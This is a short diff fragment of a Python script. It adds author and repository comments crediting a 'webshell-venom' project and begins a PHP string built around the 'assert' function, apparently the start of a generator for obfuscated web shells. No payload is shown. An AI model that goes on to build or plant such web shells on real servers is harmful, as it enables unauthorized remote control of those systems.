@@ -1,4 +1,7 @@
 import random
+#author: yzddmr6
+#github: https://github.com/yzddmr6/webshell-venom/
+#blog: https://yzddmr6.tk/
 
 func = 'assert'
 shell = '''<?php 
